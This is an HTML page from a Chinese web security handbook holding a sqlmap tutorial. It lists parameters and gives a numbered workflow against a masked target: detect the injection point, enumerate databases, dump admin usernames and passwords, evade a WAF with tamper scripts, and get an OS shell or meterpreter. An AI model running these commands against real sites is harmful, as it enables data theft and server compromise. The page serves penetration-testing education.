@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SQLmap Tutorial - 神器SQLmap | 烟雨黑帽</title>
+<meta name="description" content="sqlmap 是渗透常用的注入工具，支持市面上几乎所有常见的数据库 模式和常用参数 sqlmap支持五种不同的注入模式： 常用sqlmap参数： 一般的SQLMap操作流程： 常用语句 其他 实用技巧 这些选项可用于调整具体的SQL注入测试 枚举信息 这些选项可以用来列举后端数据库管理系统的信息、表中的…">
+<meta name="keywords" content="SQLmap Tutorial, 神器SQLmap, 网络安全, 渗透测试, web security, penetration testing, 白帽">
+<meta name="author" content="noahs">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="烟雨黑帽">
+<meta property="og:title" content="SQLmap Tutorial">
+<meta property="og:description" content="sqlmap 是渗透常用的注入工具，支持市面上几乎所有常见的数据库 模式和常用参数 sqlmap支持五种不同的注入模式： 常用sqlmap参数： 一般的SQLMap操作流程： 常用语句 其他 实用技巧 这些选项可用于调整具体的SQL注入测试 枚举信息 这些选项可以用来列举后端数据库管理系统的信息、表中的…">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="SQLmap Tutorial">
+<meta name="twitter:description" content="sqlmap 是渗透常用的注入工具，支持市面上几乎所有常见的数据库 模式和常用参数 sqlmap支持五种不同的注入模式： 常用sqlmap参数： 一般的SQLMap操作流程： 常用语句 其他 实用技巧 这些选项可用于调整具体的SQL注入测试 枚举信息 这些选项可以用来列举后端数据库管理系统的信息、表中的…">
+<meta name="theme-color" content="#0f172a">
+<script src="../assets/theme.js"></script>
+<link rel="icon" href="../favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../assets/style.css?v=1">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/atom-one-dark.min.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "烟雨黑帽"}, {"@type": "ListItem", "position": 2, "name": "神器SQLmap"}]}, {"@type": "TechArticle", "headline": "SQLmap Tutorial", "alternativeHeadline": "神器SQLmap", "description": "sqlmap 是渗透常用的注入工具，支持市面上几乎所有常见的数据库 模式和常用参数 sqlmap支持五种不同的注入模式： 常用sqlmap参数： 一般的SQLMap操作流程： 常用语句 其他 实用技巧 这些选项可用于调整具体的SQL注入测试 枚举信息 这些选项可以用来列举后端数据库管理系统的信息、表中的…", "inLanguage": "zh-CN", "author": {"@type": "Person", "name": "noahs"}, "isPartOf": {"@type": "Book", "name": "烟雨黑帽"}, "datePublished": "2026-10-11"}]}</script>
+</head>
+<body>
+<div class="searchbar">
+  <div class="search">
+    <input id="navSearch" type="search" placeholder="搜索目录 / Search…" autocomplete="off" aria-label="搜索目录">
+  </div>
+</div>
+<header class="topbar">
+  <button class="icon-btn" id="menuBtn" aria-label="菜单">&#9776;</button>
+  <a class="brand" href="../">
+    <span class="brand-mark">WS</span>
+    <span class="brand-text"><b>烟雨黑帽</b><i>Web安全与SEO实战手册</i></span>
+  </a>
+  <button class="icon-btn" id="themeBtn" aria-label="切换主题">&#9789;</button>
+</header>
+<div class="layout">
+  <aside class="sidebar" id="sidebar">
+    <a class="home-btn" href="../"><svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 10.2 12 3l9 7.2"/><path d="M5.5 9.4V21h13V9.4"/></svg><span>首页</span></a>
+    <div class="sidebar-head">目录 <span class="count">186</span></div>
+    <nav class="nav-scroll"><ul class="nav-tree"><li class="nav-item depth-0"><span class="nav-label">搜索引擎优化</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../knowledge/">基本知识</a></li><li class="nav-item depth-1"><a href="../do-i-need-seo/">我需要SEO吗</a></li><li class="nav-item depth-1"><a href="../whitehat-seo/">白帽SEO</a></li><li class="nav-item depth-1"><a href="../ai-seo/">AI SEO</a></li><li class="nav-item depth-1"><a href="../blackhat-seo/">黑帽SEO</a><ul class="nav-children"><li class="nav-item depth-2"><a href="../wildcard-directory-site-farm/">泛目录泛内页站群</a></li><li class="nav-item depth-2"><a href="../wildcard-subdomain-site-farm/">泛二级站群</a></li><li class="nav-item depth-2"><a href="../mirror-site-farm/">小偷镜像站群</a></li><li class="nav-item depth-2"><a href="../parasite-seo/">动态寄生虫</a></li><li class="nav-item depth-2"><a href="../subdirectory-in-site/">二级目录站内站</a></li><li class="nav-item depth-2"><a href="../spider-pool/">蜘蛛池</a></li><li class="nav-item depth-2"><a href="../standalone-site-farm/">独立站站群</a></li></ul></li><li class="nav-item depth-1"><a href="../black-market/">黑产研究</a></li></ul></li><li class="nav-item depth-0"><a href="../information-gathering/">信息收集</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../subdomain-enumeration-tools/">工具枚举</a></li><li class="nav-item depth-1"><a href="../dns-zone-transfer-vulnerability/">DNS域传送漏洞</a></li><li class="nav-item depth-1"><a href="../google-hacking-dorks/">google黑客</a></li><li class="nav-item depth-1"><a href="../common-ports-services-summary/">常见端口&amp;解析&amp;总结</a></li><li class="nav-item depth-1"><a href="../port-scanning-tools/">扫描工具</a></li><li class="nav-item depth-1"><a href="../nmap-scanning-guide/">nmap扫描</a></li><li class="nav-item depth-1"><a href="../email-information-gathering/">邮箱信息收集</a></li><li class="nav-item depth-1"><a href="../cdn-detection/">CDN识别</a></li><li class="nav-item depth-1"><a href="../bypass-cdn-find-real-ip/">绕过CDN查找真实IP</a></li></ul></li><li class="nav-item depth-0"><a href="../vulnerability-scanners/">扫描器</a></li><li class="nav-item depth-0"><a href="../sql-injection/">SQL注入</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../sql-injection-common-functions/">常用函数</a></li><li class="nav-item depth-1"><a href="../sql-injection-steps/">sql注入步骤</a></li><li class="nav-item depth-1"><a href="../union-sql-injection-information-schema/">union注入和information_schema库</a></li><li class="nav-item depth-1"><a href="../error-based-sql-injection-functions/">函数和报错注入</a></li><li class="nav-item depth-1"><a href="../blind-sql-injection/">SQL盲注</a></li><li class="nav-item depth-1"><a href="../other-sql-injection-techniques/">其他注入方式</a></li><li class="nav-item depth-1"><a href="../access-database-injection/">Access数据库注入</a></li><li class="nav-item depth-1"><a href="../mssql-database-injection/">MSSQL数据库注入</a></li><li class="nav-item depth-1"><a href="../mysql-database-injection/">MYSQL数据库注入</a></li><li class="nav-item depth-1 active"><a href="../sqlmap-tutorial/">神器SQLmap</a></li></ul></li><li class="nav-item depth-0"><a href="../xss-cross-site-scripting/">xss跨站脚本攻击</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../xss-principles-and-types/">xss原理和分类</a></li><li class="nav-item depth-1"><a href="../xss-bypass-techniques/">xss绕过技巧</a></li><li class="nav-item depth-1"><a href="../xss-case-studies/">xss案例</a></li></ul></li><li class="nav-item depth-0"><a href="../file-upload-download-inclusion/">文件上传下载包含</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../common-sensitive-file-paths/">常有用文件路径</a></li><li class="nav-item depth-1"><a href="../file-upload-vulnerability/">文件上传漏洞</a></li><li class="nav-item depth-1"><a href="../file-download-vulnerability/">文件下载漏洞</a></li><li class="nav-item depth-1"><a href="../file-inclusion-vulnerability/">文件包含漏洞</a></li><li class="nav-item depth-1"><a href="../upload-labs-file-upload-labs/">upload-labs上传漏洞练习</a></li></ul></li><li class="nav-item depth-0"><a href="../xxe-ssrf-csrf/">XXE、SSRF、CSRF</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../ssrf-fundamentals/">SSRF原理基础</a></li><li class="nav-item depth-1"><a href="../ssrf-practical-cases/">SSRF案例实战</a></li><li class="nav-item depth-1"><a href="../csrf-fundamentals/">CSRF原理基础</a></li><li class="nav-item depth-1"><a href="../csrf-cases-and-prevention/">CSRF案例及防范</a></li><li class="nav-item depth-1"><a href="../xxe-xml-dtd-basics/">XXE之XML_DTD基础</a></li><li class="nav-item depth-1"><a href="../xxe-payloads-and-fixes/">XXE之payload与修复</a></li><li class="nav-item depth-1"><a href="../xxe-combined-with-ssrf/">XXE结合SSRF</a></li></ul></li><li class="nav-item depth-0"><a href="../rce-and-deserialization/">远程命令执行与反序列化</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../remote-command-code-execution/">远程命令和代码执行漏洞</a></li><li class="nav-item depth-1"><a href="../deserialization-vulnerabilities/">反序列化漏洞</a></li></ul></li><li class="nav-item depth-0"><a href="../captcha-and-brute-force/">验证码与暴力破解</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../brute-force-captcha-basics/">爆破与验证码原理</a></li><li class="nav-item depth-1"><a href="../cs-architecture-brute-force/">CS架构暴力破解</a></li><li class="nav-item depth-1"><a href="../bs-architecture-brute-force/">BS架构暴力破解</a></li></ul></li><li class="nav-item depth-0"><a href="../web-editor-vulnerabilities/">WEB编辑器漏洞</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../web-editor-vulnerabilities-basics/">编辑器漏洞基础</a></li><li class="nav-item depth-1"><a href="../ewebeditor-vulnerabilities/">Ewebeditor编辑器</a></li><li class="nav-item depth-1"><a href="../fckeditor-vulnerabilities/">FCKeditor编辑器</a></li><li class="nav-item depth-1"><a href="../other-web-editors/">其他编辑器</a></li></ul></li><li class="nav-item depth-0"><a href="../web-middleware-vulnerabilities/">web中间件漏洞</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../middleware-parsing-vulnerabilities/">中间件解析漏洞</a></li><li class="nav-item depth-1"><a href="../apache-tomcat-vulnerabilities/">Tomcat常见的漏洞总结</a></li><li class="nav-item depth-1"><a href="../jboss-exploitation/">Jboss漏洞利用总结</a></li><li class="nav-item depth-1"><a href="../weblogic-exploitation/">Weblogic漏洞利用总结</a></li></ul></li><li class="nav-item depth-0"><a href="../web-penetration-testing-steps/">WEB具体步骤</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../neighboring-site-attack-privilege-escalation/">旁注和越权</a></li><li class="nav-item depth-1"><a href="../cdn-bypass/">CDN绕过</a></li><li class="nav-item depth-1"><a href="../privilege-escalation-logic-flaws/">越权与逻辑漏洞</a></li><li class="nav-item depth-1"><a href="../other-common-web-vulnerabilities/">WEB应用常见其他漏洞</a></li><li class="nav-item depth-1"><a href="../web-login-page-penetration/">WEB登陆页面渗透思路</a></li></ul></li><li class="nav-item depth-0"><a href="../social-engineering-phishing-apt/">社工、钓鱼、apt</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../social-engineering-information-gathering/">社工和信息收集</a></li><li class="nav-item depth-1"><a href="../domain-spoofing/">域名欺骗</a></li><li class="nav-item depth-1"><a href="../phishing-emails/">钓鱼邮件</a></li><li class="nav-item depth-1"><a href="../phishing-trojan-tools/">一些钓鱼用的挂马工具</a></li></ul></li><li class="nav-item depth-0"><a href="../code-audit/">代码审计</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../code-audit-tools/">代码审计工具</a></li></ul></li><li class="nav-item depth-0"><a href="../waf-bypass/">WAF绕过</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../waf-basics-cloud-waf/">WAF基础及云WAF</a></li><li class="nav-item depth-1"><a href="../waf-bypass-methods/">各种WAF绕过方法</a></li><li class="nav-item depth-1"><a href="../bypassing-waf-file-upload/">绕过WAF上传文件</a></li></ul></li><li class="nav-item depth-0"><a href="../system-privilege-escalation/">系统提权</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../windows-privilege-escalation/">windows系统提权</a></li><li class="nav-item depth-1"><a href="../linux-privilege-escalation/">linux系统提权</a></li><li class="nav-item depth-1"><a href="../database-privilege-escalation/">数据库提权操作系统</a></li></ul></li><li class="nav-item depth-0"><a href="../internal-network-lateral-movement/">内网横向渗透</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../internal-network-tunneling/">内网穿透方式</a></li><li class="nav-item depth-1"><a href="../third-party-app-privilege-escalation/">一些内网第三方应用提权</a></li></ul></li><li class="nav-item depth-0"><a href="../arp-and-dos-attacks/">ARP与DOS</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../arp-spoofing/">ARP欺骗</a></li><li class="nav-item depth-1"><a href="../dos-and-ddos-attacks/">DOS与DDOS</a></li><li class="nav-item depth-1"><a href="../dos-attack-tools/">一些DOS工具</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全研发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../learn-guide/">安全研发学习指南</a></li><li class="nav-item depth-1"><a href="../term/">相关术语</a></li><li class="nav-item depth-1"><a href="../firewall/">防火墙</a></li><li class="nav-item depth-1"><a href="../open-source/">开源项目推荐</a></li><li class="nav-item depth-1"><a href="../cl-snort/">源码学习之Snort3</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全研究</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../research-list/">导航列表</a></li><li class="nav-item depth-1"><a href="../ai-sec/">人工智能安全(AISec)</a></li><li class="nav-item depth-1"><a href="../llm-sec/">大语言模型安全(LLM security)</a></li><li class="nav-item depth-1"><a href="../apt/">APT</a></li><li class="nav-item depth-1"><a href="../attck/">ATT&amp;CK</a></li><li class="nav-item depth-1"><a href="../fuzzing/">模糊测试</a></li><li class="nav-item depth-1"><a href="../binary-sec/">二进制安全</a></li><li class="nav-item depth-1"><a href="../device-sec/">路由设备安全</a></li><li class="nav-item depth-1"><a href="../ic-sec/">工控安全</a></li><li class="nav-item depth-1"><a href="../5g-sec/">5g安全</a></li><li class="nav-item depth-1"><a href="../iov-sec/">车联网安全</a></li><li class="nav-item depth-1"><a href="../protocol-sec/">协议安全</a></li><li class="nav-item depth-1"><a href="../boofuzz/">Boofuzz</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全管理</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cso/">CSO与安全负责人</a></li><li class="nav-item depth-1"><a href="../enterprise-sec/">企业安全建设</a></li><li class="nav-item depth-1"><a href="../classified-protection/">等级保护</a></li><li class="nav-item depth-1"><a href="../sec-jd/">安全招聘</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全产品营销</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../sec-operation/">安全运营</a></li><li class="nav-item depth-1"><a href="../axure-rp/">Axure RP</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">应急响应</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../incident-response-learn-guide/">应急响应学习参考</a></li><li class="nav-item depth-1"><a href="../traceback/">溯源反制</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">CVE</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cve/">CVE相关参考</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">渗透测试</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../pentest-learn-guide/">渗透测试学习参考</a></li><li class="nav-item depth-1"><a href="../pentest-term/">术语</a></li><li class="nav-item depth-1"><a href="../kali-linux/">Kali Linux</a></li><li class="nav-item depth-1"><a href="../red-team/">红队</a></li><li class="nav-item depth-1"><a href="../brute-force/">暴力破解</a></li><li class="nav-item depth-1"><a href="../xss/">跨站脚本攻击</a></li><li class="nav-item depth-1"><a href="../csrf/">跨站请求伪造</a></li><li class="nav-item depth-1"><a href="../reverse-shell/">反弹Shell</a></li><li class="nav-item depth-1"><a href="../capture-package/">抓包</a></li><li class="nav-item depth-1"><a href="../crack/">破解</a></li><li class="nav-item depth-1"><a href="../nmap/">Nmap</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">CTF</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../ctf-learn-guide/">基础知识</a></li><li class="nav-item depth-1"><a href="../env-config/">测试环境搭建</a></li><li class="nav-item depth-1"><a href="../ctf-skill/">CTF竞赛常用基本解题技巧</a></li><li class="nav-item depth-1"><a href="../pwn/">PWN</a></li><li class="nav-item depth-1"><a href="../crypto/">Crypto</a></li><li class="nav-item depth-1"><a href="../ctf-re/">RE</a></li><li class="nav-item depth-1"><a href="../hackthebox/">HackTheBox</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">架构</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../architecture-learn-guide/">架构学习指南</a></li><li class="nav-item depth-1"><a href="../notes/">读书笔记</a></li><li class="nav-item depth-1"><a href="../design-pattern/">设计模式</a></li><li class="nav-item depth-1"><a href="../ddd/">领域驱动设计</a></li><li class="nav-item depth-1"><a href="../micro-services/">微服务</a></li><li class="nav-item depth-1"><a href="../scrum/">Scrum</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">后端开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../backend-learn-guide/">后端开发学习指南</a></li><li class="nav-item depth-1"><a href="../computer-networking/">计算机网络</a></li><li class="nav-item depth-1"><a href="../os/">操作系统</a></li><li class="nav-item depth-1"><a href="../database/">数据库</a></li><li class="nav-item depth-1"><a href="../search-engine/">搜索引擎</a></li><li class="nav-item depth-1"><a href="../python/">Python</a></li><li class="nav-item depth-1"><a href="../go/">Golang</a></li><li class="nav-item depth-1"><a href="../rust/">Rust</a></li><li class="nav-item depth-1"><a href="../rabbitmq/">RabbitMQ</a></li><li class="nav-item depth-1"><a href="../kafka/">Kafka</a></li><li class="nav-item depth-1"><a href="../jwt/">JWT认证</a></li><li class="nav-item depth-1"><a href="../regex/">正则表达式</a></li><li class="nav-item depth-1"><a href="../git/">Git</a></li><li class="nav-item depth-1"><a href="../git-flow/">Git Flow</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">机器学习</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../machine-learning/">机器学习</a></li><li class="nav-item depth-1"><a href="../nlp/">自然语言处理</a></li><li class="nav-item depth-1"><a href="../llms/">大语言模型LLMs</a></li><li class="nav-item depth-1"><a href="../statistical-learning/">统计学习方法笔记</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">前端开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../frontend-learn-guide/">前端开发学习指南</a></li><li class="nav-item depth-1"><a href="../html5/">HTML5</a></li><li class="nav-item depth-1"><a href="../css/">CSS</a></li><li class="nav-item depth-1"><a href="../js/">JavaScript</a></li><li class="nav-item depth-1"><a href="../typescript/">TypeScript</a></li><li class="nav-item depth-1"><a href="../vue/">Vue.js</a></li><li class="nav-item depth-1"><a href="../react/">React</a></li><li class="nav-item depth-1"><a href="../npm/">NPM</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">爬虫开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cookie-pool/">Cookie池设计</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">DevOps</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../devops-learn-guide/">DevOps学习指南</a></li><li class="nav-item depth-1"><a href="../docker/">Docker</a></li><li class="nav-item depth-1"><a href="../k8s/">Kubernetes</a></li><li class="nav-item depth-1"><a href="../vm/">虚拟机</a></li><li class="nav-item depth-1"><a href="../linux/">Linux</a></li><li class="nav-item depth-1"><a href="../windows/">Windows</a></li><li class="nav-item depth-1"><a href="../sre/">SRE</a></li><li class="nav-item depth-1"><a href="../shell/">Shell</a></li><li class="nav-item depth-1"><a href="../syslog/">syslog</a></li></ul></li><li class="nav-item depth-0"><a href="../todo-list/">Todo List</a></li></ul>
+</nav>
+  </aside>
+  <div class="scrim" id="scrim"></div>
+  <main class="content">
+<article class="article"><nav class="crumbs"><a href="../">烟雨黑帽</a><span>/</span><span>神器SQLmap</span></nav><a class="ad-banner" href="../knowledge/" aria-label="SEO专题推广"><img src="../assets/ad-seo.svg" alt="Web安全与SEO实战手册 — 搜索引擎优化(SEO)专题推广" width="970" height="90" loading="lazy"></a><h1>神器SQLmap</h1><p class="cn-title">SQLmap Tutorial</p><details class="toc-box" open><summary>本页目录 / On this page</summary><div class="toc">
+<ul>
+<li><a href="#_1">模式和常用参数</a><ul>
+<li><a href="#sqlmap">sqlmap支持五种不同的注入模式：</a></li>
+<li><a href="#sqlmap_1">常用sqlmap参数：</a></li>
+</ul>
+</li>
+<li><a href="#sqlmap_2">一般的SQLMap操作流程：</a></li>
+<li><a href="#_2">常用语句</a></li>
+<li><a href="#_3">其他</a><ul>
+<li><a href="#_4">实用技巧</a></li>
+<li><a href="#_5">枚举信息</a></li>
+<li><a href="#_6">操作系统访问</a></li>
+<li><a href="#windows">Windows注册表访问</a></li>
+<li><a href="#_7">优化功能</a></li>
+<li><a href="#_8">指定注入</a></li>
+</ul>
+</li>
+<li><a href="#tamper">Tamper功能</a></li>
+</ul>
+</div>
+</details><div class="article-body"><p>sqlmap 是渗透常用的注入工具，支持市面上几乎所有常见的数据库</p>
+<h2 id="_1">模式和常用参数</h2>
+<hr />
+<h3 id="sqlmap">sqlmap支持五种不同的注入模式：</h3>
+<pre><code class="language-cmd">基于布尔的盲注：可以根据返回页面判断条件真假的注入；
+基于时间的盲注：用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断；
+基于报错的注入：页面会返回错误信息，或者把注入的语句的结果直接返回在页面中；
+联合查询的注入：可以使用union的情况下的注入；
+堆叠查询的注入：可以同时执行多条语句的执行时的注入。
+
+</code></pre>
+<h3 id="sqlmap_1">常用sqlmap参数：</h3>
+<pre><code class="language-cmd">-D 数据库名    -T 数据库表名     -C 数据库列名     -U 数据库用户名
+-D 数据库名 --tables    #获取D数据库中所有的表名
+-D 数据库名 -T 表名 --columns    #获取D数据库中T表里所有的列名
+-T 表名 -C username，password --dump   #下载T表里username，password列的数据内容
+
+-u   #-u=--url=URL ，指定url地址,get请求可以在url加上相关参数
+-r   #指定加载文件 ，适用于所有的请求和https。 流程是抓包、保存到文件、从文件加载HTTP请求；方便跳过设置一些其他参数（cookie，POST等）
+-p   #指定用url或文件中的哪个参数做注入参数
+-m   #读取文件中的url列表以批量测试
+--date    #post方式传入参数 --date &quot;id=1&amp;co=5&quot;
+--dbs     #显示所有的数据库
+--current-user #获取当前数据库用户
+--current-db   #获取网站当前数据库
+--is-dba  #判断当前的用户是否为管理员
+--users   #获取所有数据库用户
+--level   #测试的等级（1-5，默1）,数值&gt;=2的时候也会检查cookie里面的参数，当&gt;=3的时候将检查User-agent和Referer。
+--risk    #测试的风险（0-3，默1）,1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。
+--threads #同时执行测试的线程数
+--mobile  #模拟测试手机环境站点
+--batch -smart  #不需要人确定，自动填写yes
+--batch -smart  #全自动化判断测试，不需要人确定
+--os-shell   #获取系统交互的shell
+--tamper &quot;  &quot;    #sqlmap绕过waf，需要加载绕过方式脚本，可多个
+--passwords  #尝试解码出hash密码原文
+-v   #输出信息级别: 0-6 ，
+     “0”只显示python错误以及严重的信息；
+     1同时显示基本信息和警告信息（默认）；
+     “2”同时显示debug信息；
+     “3”同时显示注入的payload；
+     “4”同时显示HTTP请求；
+     “5”同时显示HTTP响应头；
+     “6”同时显示HTTP响应页面；
+     如果想看到sqlmap发送的测试payload最好的等级就是3。
+
+--file-read  #读取服务器上指定文件内容 --file-read &quot;C:/example.exe&quot;
+--file-write #上传本地文件 --file-write &quot;c:/1.txt&quot; --file-dest &quot;C:/php/sql.php&quot;
+--file-dest  #上传到服务器指定目录
+</code></pre>
+<h2 id="sqlmap_2">一般的SQLMap操作流程：</h2>
+<pre><code class="language-cmd"># 1.通过手工检测的方式，找到合适的注入点
+payload：'         #返回错误
+payload：and 1=1   #返回正常
+payload：and 1=2   #返回错误
+##满足以上条件即存在注入
+
+# 2.检查注入点：
+sqlmap -u &quot;***.com --data &quot;word=1&amp;number=5&quot; --batch --level3
+
+# 3.爆所有数据库信息：
+sqlmap -u &quot;***.com --data &quot;word=1&amp;number=5&quot; --batch --dbs 
+
+# 4.爆当前数据库信息，爆当前用户权限。
+sqlmap -u &quot;***.com --data &quot;word=1&amp;number=5&quot; --batch --current-db --is-dba
+
+# 5.指定库名列出所有表：
+sqlmap -u &quot;***.com --data &quot;word=1&amp;number=5&quot; --batch -D news --tables 
+
+# 6.指定库名表名列出所有字段：
+sqlmap -u &quot;***.com --data &quot;word=1&amp;number=5&quot; --batch -D news -T admin --column 
+
+# 7.指定库名表名字段dump出指定字段：
+sqlmap -u &quot;***.com --data &quot;word=1&amp;number=5&quot; --batch -D news -T admin -C name,pswd --dump 
+
+# 8.加载脚本绕过防火墙
+sqlmap -u &quot;***.com --data &quot;word=1&amp;number=5&quot; --tamper randomcase.py
+
+# 9.爆当前的用户名称
+sqlmap -u &quot;***.com --data &quot;word=1&amp;number=5&quot; --current-user
+
+# 10.爆当前用户密码
+sqlmap -u &quot;***.com --data &quot;word=1&amp;number=5&quot; --passwods
+
+# 11.连接系统交互shell
+sqlmap -u &quot;***.com --data &quot;word=1&amp;number=5&quot; --os-shell
+</code></pre>
+<h2 id="_2">常用语句</h2>
+<pre><code class="language-cmd"># 基础检测语法
+sqlmap.py -u ***.com
+
+# 批量检测
+sqlmap.py -m target.txt
+## 注意target.txt跟sqlmap在同一个目录下。
+
+# 获取表中的数据个数
+sqlmap.py -u &quot;***.com --count -D testdb
+
+# 站点爬取
+sqlmap.py -u &quot;***.com --batch --crawl=3
+
+# 使用hex避免字符编码导致数据丢失
+sqlmap.py -u &quot;***.com --banner --hex -v 3 --parse-errors
+
+# 模拟测试手机环境站点
+python sqlmap.py -u &quot;***.com --mobile
+
+# 智能判断测试
+sqlmap.py -u &quot;***.com --batch --smart
+
+# 结合burpsuite进行注入
+sqlmap.py -r burpsuite 抓包.txt
+
+# sqlmap 自动填写表单注入
+sqlmap.py -u URL --forms
+
+# 执行shell命令
+sqlmap.py -u &quot;url&quot; --os-cmd=&quot;ls&quot; #执行net user命令
+sqlmap.py -u &quot;url&quot; --os-shell    #系统交互的shell
+
+# 延时注入
+sqlmap --dbs -u &quot;url&quot; --delay 0.5 #延时0.5秒*/ 
+sqlmap --dbs -u &quot;url&quot; --safe-freq #请求2次*/
+</code></pre>
+<h2 id="_3">其他</h2>
+<h3 id="_4">实用技巧</h3>
+<p>这些选项可用于调整具体的SQL注入测试</p>
+<pre><code class="language-cmd">--technique=TECH    SQL注入技术测试（默认BEUST）    
+--time-sec=TIMESEC  DBMS响应的延迟时间（默认为5秒）   
+--union-cols=UCOLS  定列范围用于测试UNION查询注入   
+--union-char=UCHAR  暴力猜测列的字符数   
+--union-from=UFROM  SQL注入UNION查询使用的格式  
+--dns-domain=DNS..  DNS泄露攻击使用的域名   
+--second-order=S..  URL搜索产生的结果页面
+</code></pre>
+<h3 id="_5">枚举信息</h3>
+<p>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外还可以运行自定义的SQL语句。</p>
+<pre><code class="language-cmd">-a, –all           获取所有信息   
+-b, –banner        获取数据库管理系统的标识  
+--current-user      获取数据库管理系统当前用户   
+--current-db        获取数据库管理系统当前数据库   
+--hostname         获取数据库服务器的主机名称  
+--is-dba            检测DBMS当前用户是否DBA  
+--users             枚举数据库管理系统用户  
+--passwords         枚举数据库管理系统用户密码哈希   
+--privileges        枚举数据库管理系统用户的权限   
+--roles            枚举数据库管理系统用户的角色   
+--dbs             枚举数据库管理系统数据库  
+--tables            枚举的DBMS数据库中的表   
+--columns          枚举DBMS数据库表列   
+--schema            枚举数据库架构  
+--count             检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url –count -D testdb  
+--dump            转储数据库表项  
+--dump-all          转储数据库所有表项  
+--search           搜索列（S），表（S）和/或数据库名称（S）  
+--comments          获取DBMS注释  
+-D DB               要进行枚举的指定数据库名  
+-T TBL              DBMS数据库表枚举  
+-C COL             DBMS数据库表列枚举  
+-X EXCLUDECOL     DBMS数据库表不进行枚举  
+-U USER           用来进行枚举的数据库用户  
+--exclude-sysdbs    枚举表时排除系统数据库   
+--start=LIMITSTART  获取第一个查询输出数据位置  
+--stop=LIMITSTOP   获取最后查询的输出数据  
+--first=FIRSTCHAR   第一个查询输出字的字符获取  
+--last=LASTCHAR    最后查询的输出字字符获取  
+--sql-query=QUERY   要执行的SQL语句  
+--sql-shell         提示交互式SQL的shell  
+--sql-file=SQLFILE  要执行的SQL文件  
+</code></pre>
+<h3 id="_6">操作系统访问</h3>
+<p>这些选项可以用于访问后端数据库管理系统的底层操作系统</p>
+<pre><code class="language-cmd">--os-cmd=OSCMD   执行操作系统命令（OSCMD）   
+--os-shell       交互式的操作系统的shell   
+--os-pwn          获取一个OOB shell，meterpreter或VNC   
+--os-smbrelay       一键获取一个OOBshell，meterpreter或VNC  
+--os-bof           存储过程缓冲区溢出利用  
+--priv-esc          数据库进程用户权限提升  
+--msf-path=MSFPATH  MetasploitFramework本地的安装路径  
+--tmp-path=TMPPATH  远程临时文件目录的绝对路径  
+</code></pre>
+<h3 id="windows">Windows注册表访问</h3>
+<p>这些选项可以被用来访问后端数据库管理系统Windows注册表</p>
+<pre><code class="language-cmd">--reg-read          读一个Windows注册表项值  
+--reg-add           写一个Windows注册表项值数据  
+--reg-del           删除Windows注册表键值  
+--reg-key=REGKEY    Windows注册表键  
+--reg-value=REGVAL  Windows注册表项值  
+--reg-data=REGDATA  Windows注册表键值数据  
+--reg-type=REGTYPE  Windows注册表项值类型  
+</code></pre>
+<h3 id="_7">优化功能</h3>
+<p>这些选项可用于优化sqlmap性能</p>
+<pre><code class="language-cmd">-o               打开所有的优化开关    
+--predict-output    预测普通查询输出    
+--keep-alive        使用持久HTTP（S）连接    
+--null-connection   获取页面长度    
+--threads=THREADS   当前http(s)最大请求数 (默认 1)  
+</code></pre>
